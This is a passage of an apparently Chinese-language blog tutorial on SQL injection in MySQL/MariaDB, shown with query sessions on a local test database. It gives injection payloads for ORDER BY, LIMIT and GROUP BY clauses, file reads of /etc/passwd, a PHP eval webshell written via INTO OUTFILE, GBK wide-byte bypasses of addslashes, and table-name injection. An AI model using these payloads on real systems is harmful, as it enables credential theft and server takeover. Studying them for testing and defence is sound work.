class="line">20</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select id from message order by rand(true);</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  5 |</span><br><span class="line">|  3 |</span><br><span class="line">|  1 |</span><br><span class="line">|  2 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.002</span> sec)</span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">rand</span>(<span class="hljs-literal">false</span>);</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  1 |</span><br><span class="line">|  5 |</span><br><span class="line">|  2 |</span><br><span class="line">|  3 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rand(true)</code>与<code>rand(flase)</code>返回不同来判断</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select id from message order by rand(SUBSTR((SELECT database()),1,1)&gt;'t');</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  1 |</span><br><span class="line">|  5 |</span><br><span class="line">|  2 |</span><br><span class="line">|  3 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">rand</span>(<span class="hljs-keyword">SUBSTR</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&lt;<span class="hljs-string">'t'</span>);</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  1 |</span><br><span class="line">|  5 |</span><br><span class="line">|  2 |</span><br><span class="line">|  3 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">rand</span>(<span class="hljs-keyword">SUBSTR</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'t'</span>);</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  5 |</span><br><span class="line">|  3 |</span><br><span class="line">|  1 |</span><br><span class="line">|  2 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="延时注入-order-by-if"><a href="#延时注入-order-by-if" class="headerlink" title="延时注入 order by if()"></a>延时注入 order by if()</h4><p>不推荐，因为每条数据都会执行延时，<strong>能用其他方法就不使用延时</strong>。</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select id from message order by IF(1,sleep(3),0);</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">| id |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">|  1 |</span><br><span class="line">|  2 |</span><br><span class="line">|  3 |</span><br><span class="line">|  5 |</span><br><span class="line">+<span class="hljs-comment">----+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">12.214</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>延时了 12s 左右。</p><h3 id="Limit-注入"><a href="#Limit-注入" class="headerlink" title="Limit 注入"></a>Limit 注入</h3><p>先看看 Mysql 5 中的 select 语法</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> </span><br><span class="line">    [<span class="hljs-keyword">ALL</span> | <span class="hljs-keyword">DISTINCT</span> | <span class="hljs-keyword">DISTINCTROW</span> ] </span><br><span class="line">      [<span class="hljs-keyword">HIGH_PRIORITY</span>] </span><br><span class="line">      [<span class="hljs-keyword">STRAIGHT_JOIN</span>] </span><br><span class="line">      [<span class="hljs-keyword">SQL_SMALL_RESULT</span>] [<span class="hljs-keyword">SQL_BIG_RESULT</span>] [<span class="hljs-keyword">SQL_BUFFER_RESULT</span>] </span><br><span class="line">      [<span class="hljs-keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="hljs-keyword">SQL_CALC_FOUND_ROWS</span>] </span><br><span class="line">    select_expr [, select_expr ...] </span><br><span class="line">    [<span class="hljs-keyword">FROM</span> table_references </span><br><span class="line">    [<span class="hljs-keyword">WHERE</span> where_condition] </span><br><span class="line">    [<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> {col_name | expr | <span class="hljs-keyword">position</span>} </span><br><span class="line">      [<span class="hljs-keyword">ASC</span> | <span class="hljs-keyword">DESC</span>], ... [<span class="hljs-keyword">WITH</span> <span class="hljs-keyword">ROLLUP</span>]] </span><br><span class="line">    [<span class="hljs-keyword">HAVING</span> where_condition] </span><br><span class="line">    [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> {col_name | expr | <span class="hljs-keyword">position</span>} </span><br><span class="line">      [<span class="hljs-keyword">ASC</span> | <span class="hljs-keyword">DESC</span>], ...] </span><br><span class="line">    [<span class="hljs-keyword">LIMIT</span> {[<span class="hljs-keyword">offset</span>,] <span class="hljs-keyword">row_count</span> | <span class="hljs-keyword">row_count</span> <span class="hljs-keyword">OFFSET</span> <span class="hljs-keyword">offset</span>}] </span><br><span class="line">    [<span class="hljs-keyword">PROCEDURE</span> procedure_name(argument_list)] </span><br><span class="line">    [<span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'file_name'</span> export_options </span><br><span class="line">      | <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">'file_name'</span> </span><br><span class="line">      | <span class="hljs-keyword">INTO</span> var_name [, var_name]] </span><br><span class="line">    [<span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span> | <span class="hljs-keyword">LOCK</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SHARE</span> <span class="hljs-keyword">MODE</span>]]</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到<code>LIMIT</code>后可以接<code>PROCEDURE</code>与<code>INTO</code>，而<code>INTO</code>用于写 webshell 使用，这里接不赘述，我们重点来看<code>PROCUDURE</code>，而且这里与版本有关，新版本的在<code>PROCUDURE</code>中已不支持使用<code>SELECT</code></p><p>老版本(为测试具体版本号，估计在 5.7 以前)可以若没有<code>order by</code>后可面接<code>union</code>，有<code>order by</code>可用<code>benchmark</code>或者报错注入，详情参考<a href="http://vinc.top/2017/04/01/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql-limit-%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">【SQL注入】mysql limit 注入</a></p><h4 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id&gt;0 order by id LIMIT 0,1;</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">| id | username | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: ':10.3.11-MariaDB'</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Group-By-注入"><a href="#Group-By-注入" class="headerlink" title="Group By 注入"></a>Group By 注入</h3><h4 id="报错注入-3"><a href="#报错注入-3" class="headerlink" title="报错注入"></a>报错注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~10.3.11-MariaDB~'</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and (select 1 from(select count(*),concat((select (select (SELECT @@version)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '10.3.11-MariaDB1' for key 'group_key'</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and if(mid(user(),1,1)='r',sleep(3),0);</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">| id | username | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">9.150</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Union-注入-1"><a href="#Union-注入-1" class="headerlink" title="Union 注入"></a>Union 注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id union select 1,2,3;</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">| id | username | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">|  2 | hasaki   | hasaki |</span><br><span class="line">|  3 | 666      | 2333   |</span><br><span class="line">|  1 | 2        | 3      |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>;</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">| id | username | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">|  1 | 2        | 3      |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">3</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>;</span><br><span class="line">+<span class="hljs-comment">----+----------------+--------+</span></span><br><span class="line">| id | username       | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------------+--------+</span></span><br><span class="line">|  1 | root@localhost | 3      |</span><br><span class="line">+<span class="hljs-comment">----+----------------+--------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.002</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p><p>查询用户读写权限：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> file_priv <span class="hljs-keyword">FROM</span> mysql.user <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">'root'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先查看变量确定权限</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%secure%'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>当 secure_file_priv 为空，就可以读取磁盘的目录。</li><li>当 secure_file_priv 为G:\，就可以读取G盘的文件。</li><li>当 secure_file_priv 为 null，load_file 就不能加载文件。</li></ul><h4 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h4><p>条件</p><ul><li>需要有读取文件的权限</li><li>需要知道文件的绝对物理路径。</li><li>要读取的文件大小必须小于 max_allowed_packet</li></ul><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> @@max_allowed_packet;</span><br></pre></td></tr></tbody></table></figure><p></p><p>直接使用绝对路径</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">"/etc/passwd"</span>);</span><br><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>));</span><br><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-number">0x2f6574632f706173737764</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="SELECT-导出"><a href="#SELECT-导出" class="headerlink" title="SELECT 导出"></a>SELECT 导出</h4><p>条件</p><ul><li>一般要指定绝对路径</li><li>需导出的目录有可写权限</li><li>要outfile出的文件不能已经存在</li></ul><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'/tmp/test'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h4><p>条件</p><ul><li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li><li>对需导出的目录有可写权限。</li></ul><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span>  <span class="hljs-string">"&lt;?php eval($_POST['a'])?&gt;"</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'/var/www/html/shell.php'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="hljs-string">"SET NAMES 'gbk'"</span>);</span><br><span class="line"></span><br><span class="line">$name = <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) ? addslashes($_GET[<span class="hljs-string">'name'</span>]) : <span class="hljs-number">1</span>;</span><br><span class="line">$sql = <span class="hljs-string">"SELECT * FROM test WHERE names='{$name}'"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>addslashes()</code>会在单引号或双引号前加上一个<code>\</code>。当 mysql 使用 GBK 字符集时，会把两个字符当作一个汉字，如<code>%df%5c</code>为運字。我们输入<code>name=root%df%27</code>，<code>%</code>在服务器端会出现如下转换：<code>root%df%27</code> -&gt; <code>root%df%5c%27</code> -&gt; <code>root運'</code>。</p><p>更多内容可见：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">浅析白盒审计中的字符编码及SQL注入</a></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="hljs-attribute">name</span>=1%df'</span><br><span class="line">index.php?<span class="hljs-attribute">name</span>=1%a1'</span><br><span class="line">index.php?<span class="hljs-attribute">name</span>=1%aa'</span><br><span class="line"><span class="hljs-built_in">..</span>.</span><br></pre></td></tr></tbody></table></figure><p></p><p>在被<code>addslashes</code>后，出现<code>%XX%5c</code>，当前一个字符的 ascii 码值大于 128 时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅<code>%df</code>可以吃掉<code>\</code>。</p><h3 id="表名可控注入"><a href="#表名可控注入" class="headerlink" title="表名可控注入"></a>表名可控注入</h3><p>详细可参考<a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="noopener">当表名可控的注入遇到了Describe时的几种情况</a></p><h4 id="表名不完全可控且DESC的表名含有反引号-SELECT的表名不含反引号"><a href="#表名不完全可控且DESC的表名含有反引号-SELECT的表名不含反引号" class="headerlink" title="表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号"></a>表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号</h4><p>test.php 代码如下</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="hljs-string">"127.0.0.1"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>);</span><br><span class="line">mysql_query(<span class="hljs-string">"use test"</span>);</span><br><span class="line">$table = $_GET[<span class="hljs-string">'table'</span>];</span><br><span class="line">mysql_query(<span class="hljs-string">"desc `shop_$table`"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="hljs-string">"select * from shop_$table where 1=1"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> $sql;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="hljs-string">"$sql"</span>)));</span><br><span class="line"><span class="hljs-keyword">echo</span> mysql_error();</span><br></pre></td></tr></tbody></table></figure><p></p><p>payload :</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user` `where updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5e24</span>,(select user()),<span class="hljs-number">0x5e24</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>`</span><br></pre></td></tr></tbody></table></figure><p></p><p>shop_users 后面的两个``,做了shop_users 表的别名，所以无影响，不会进入 die。sql 语句才得以执行</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> message <span class="hljs-string">``</span> <span class="hljs-keyword">where</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#; where 1=1;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossM